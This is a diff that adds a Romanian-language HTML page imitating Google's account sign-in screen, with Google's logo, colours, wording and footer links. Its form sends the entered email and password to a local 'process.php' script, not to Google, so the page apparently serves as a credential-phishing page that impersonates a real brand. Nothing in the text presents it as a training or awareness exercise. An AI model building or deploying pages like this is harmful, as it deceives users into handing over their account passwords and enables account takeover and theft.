@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="ro">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Conectează-te - Contul Google</title>
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      width: 450px;
+      padding: 48px 40px 36px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .google-logo {
+      width: 75px;
+      height: 24px;
+      margin-bottom: 16px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin: 0 0 24px;
+      color: #202124;
+    }
+
+    form {
+      width: 100%;
+    }
+
+    .input-container {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 13px 15px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      color: #202124;
+      box-sizing: border-box;
+    }
+
+    input:focus {
+      border-color: #1a73e8;
+      outline: none;
+    }
+
+    .button-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 32px;
+    }
+
+    .create-account {
+      color: #1a73e8;
+      font-weight: 500;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .next-button {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .next-button:hover {
+      background-color: #1669d6;
+    }
+
+    .footer {
+      display: flex;
+      justify-content: space-between;
+      padding: 20px 0;
+      width: 450px;
+      font-size: 12px;
+      color: #757575;
+      margin-top: 20px;
+    }
+
+    .footer a {
+      color: #757575;
+      text-decoration: none;
+      margin-right: 24px;
+    }
+
+    .private-mode {
+      width: 100%;
+      font-size: 12px;
+      color: #5f6368;
+      margin-top: 40px;
+    }
+
+    .private-mode a {
+      color: #1a73e8;
+      text-decoration: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="main-container">
+    <div class="login-container">
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google"
+        class="google-logo">
+      <h1>Conectează-te</h1>
+      <p>Folosește Contul Google</p>
+      <form action="process.php" method="post">
+        <div class="input-container">
+          <input type="text" name="email" placeholder="Email sau telefon" required>
+        </div>
+        <div class="input-container">
+          <input type="password" name="password" placeholder="Introduceți parola" required>
+        </div>
+        <div class="private-mode">
+          Nu este computerul tău? Pentru a te conecta, folosește o fereastră Privată. <a href="#">Află mai multe despre
+            folosirea modului pentru invitați</a>
+        </div>
+        <div class="button-container">
+          <a href="#" class="create-account">Creează cont</a>
+          <button type="submit" class="next-button">Următorul</button>
+        </div>
+      </form>
+    </div>
+    <div class="footer">
+      <div>
+        <a href="#">română</a>
+      </div>
+      <div>
+        <a href="#">Ajutor</a>
+        <a href="#">Confidențialitate</a>
+        <a href="#">Termeni și condiții</a>
+      </div>
+    </div>
+  </div>
+</body>
+
+</html>
